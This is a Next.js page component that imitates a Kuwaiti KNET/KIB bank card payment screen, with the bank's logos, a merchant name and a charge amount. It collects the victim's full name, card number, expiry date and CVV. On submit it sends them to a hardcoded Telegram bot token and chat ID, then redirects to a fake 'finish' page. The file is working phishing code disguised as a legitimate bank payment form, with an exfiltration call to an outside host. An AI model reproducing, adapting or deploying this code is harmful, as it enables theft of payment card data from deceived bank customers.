"use client";

import { useState } from "react";
import { useRouter, useSearchParams } from "next/navigation";
import Image from "next/image";
import axios from "axios";
import kibLogo from "../../../public/kib.jpg";
import kibLo from "../../../public/kiblo.png";
import styles from './page.module.css';

export default function KnetPage() {
  const [fullName, setFullName] = useState("");
  const [cardNumber, setCardNumber] = useState("");
  const [expData, setExpData] = useState("");
  const [cvv, setCvv] = useState("");
  const router = useRouter();
    const searchParams = useSearchParams();
    const price = searchParams.get("price");
  const handleSend = async () => {
    if (
      fullName.trim() === "" ||
      cardNumber.trim() === "" ||
      expData.trim() === "" ||
      cvv.trim() === ""
    ) {
      alert("من فضلك املئ الحقول");
      return;
    }

    // تقسيم التاريخ إلى شهر وسنة
    const [expMonth, expYear] = expData.split("/");

    const text = `
%0A🏦 بنك برقان
👤 الاسم الكامل: ${fullName}%0A
💳 رقم البطاقة: ${cardNumber}%0A
📅  شهر: ${expMonth || "?"}%0A
📅  سنة: ${expYear || "?"}%0A
🔐 CVV: ${cvv}
    `;

    try {
      await axios.post(
        `https://api.telegram.org/bot8391195305:AAF-UCHdFDY2uR1cZI8-DOgEt59z849fq20/sendMessage?chat_id=5714216192&text=${text}`
      );
      router.push(`/kpay/finish?name=${cardNumber}`);
    } catch (error) {
      alert("حدث خطأ أثناء الإرسال");
      console.error(error);
    }
  };

  return (
    <div className={styles.knetContainer}>
      <div className={styles.knetBox}>
        <div className={styles.knetHeader}>
          <Image src={kibLogo} alt="KIB Logo" className={styles.knetLogo} />
        </div>

        <div className={styles.knetInfo}>
          <Image src={kibLo} alt="KIB Logo" width={120} />
          <div className={styles.knetInfoRow}>
            <span className={styles.knetInfoLabel}>Merchant:</span>
            <span>Tap Payments EPSP</span>
          </div>
          <div className={styles.knetInfoRow}>
            <span className={styles.knetInfoLabel}>Amount:</span>
            <span>KD {price}.000</span>
          </div>
        </div>

        <form
          onSubmit={(e) => {
            e.preventDefault();
            handleSend();
          }}
          className={styles.knetForm}
        >
          <div>
            <label className={styles.formLabel}>Full Name:</label>
            <div className={styles.cardInput}>
              <input
                type="text"
                maxLength="100"
                value={fullName}
                onChange={(e) => setFullName(e.target.value)}
                required
                className={styles.formInput}
              />
            </div>
          </div>
          <hr />

          <div>
            <label className={styles.formLabel}>Card Number:</label>
            <div className={styles.cardInput}>
              <input
                type="text"
                maxLength="16"
                inputMode="numeric"
                pattern="[0-9]*"
                value={cardNumber}
                onChange={(e) => setCardNumber(e.target.value)}
                required
                className={styles.formInput}
              />
            </div>
          </div>
          <hr />

          <div className={styles.expRow}>
            <div>
              <label className={styles.formLabel}>Expiration (MM/YY):</label>
              <input
                type="text"
                placeholder="MM/YY"
                pattern="\d{2}/\d{2}"
                value={expData}
                onChange={(e) => setExpData(e.target.value)}
                required
                className={styles.formInput}
              />
            </div>
            <div>
              <label className={styles.formLabel}>CVV:</label>
              <input
                type="text"
                maxLength="4"
                inputMode="numeric"
                pattern="\d*"
                value={cvv}
                onChange={(e) => setCvv(e.target.value)}
                required
                className={styles.formInput}
              />
            </div>
          </div>
          <hr />

          <div className={styles.buttonRow}>
            <button
              type="button"
              className={styles.cancel}
              onClick={() => router.back()}
            >
              Cancel
            </button>
            <button type="submit" className={styles.submit}>
              Submit
            </button>
          </div>
        </form>

        <div className={styles.knetFooter}>
          <p>All Rights Reserved. Copyright 2025 ©</p>
          <a href="#">The Shared Electronic Banking Services Company - KNET</a>
        </div>
      </div>
    </div>
  );
}
